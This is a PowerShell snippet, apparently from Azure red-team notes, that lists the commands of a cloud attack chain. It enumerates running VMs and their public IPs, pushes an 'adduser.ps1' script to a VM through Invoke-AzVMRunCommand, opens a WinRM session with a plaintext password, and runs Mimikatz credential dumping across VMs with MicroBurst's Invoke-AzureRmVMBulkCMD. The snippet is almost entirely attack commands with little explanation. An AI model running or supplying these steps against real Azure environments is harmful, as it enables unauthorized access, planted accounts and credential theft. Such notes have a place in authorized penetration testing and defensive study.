---
id: ccb2e088-fbf3-41b9-846e-6889522fd701
type: code
language: Powershell
verified: false
created_at: '2023-05-25T04:23:14.560793+00:00'
updated_at: '2023-05-25T04:24:43.307847+00:00'
---

# Code Snippet ccb2e088

**Language**: Powershell

```powershell
# Get Public IP of VM : query the network interface
PS AzureAD> Get-AzVM -Name <RESOURCE> -ResourceGroupName <RG-NAME> | select -ExpandProperty NetworkProfile
PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368>
PS AzureAD> Get-AzPublicIpAddress -Name <RESOURCEIP>

# Execute Powershell script on the VM
PS AzureAD> Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath '.\adduser.ps1' -Verbose

# Connect via WinRM
PS C:\Tools> $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\Tools> $creds = New-Object System.Management.Automation.PSCredential('username', $Password)
PS C:\Tools> $sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
PS C:\Tools> Enter-PSSession $sess


# List available VMs
PS C:\> Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
ResourceGroupName    Name       
-----------------    ----       
TESTRESOURCES        Remote-Test

# Execute Powershell script on the VM
PS C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1


# Excecute Mimikatz on the VM
PS C:\> Import-module MicroBurst.psm1
PS C:\> Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```


